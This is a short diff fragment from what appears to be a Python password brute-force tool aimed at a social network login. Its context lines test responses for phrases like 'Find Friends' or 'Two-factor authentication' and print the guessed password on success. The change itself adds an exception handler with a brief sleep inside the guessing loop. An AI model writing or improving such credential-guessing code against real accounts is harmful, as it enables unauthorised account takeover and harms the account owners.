@@ -43,4 +43,5 @@ while True:
             if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
                 print('Your password is : ', passw)
                 break
-    
+    except Exception as e:
+        time.sleep(0.0001)
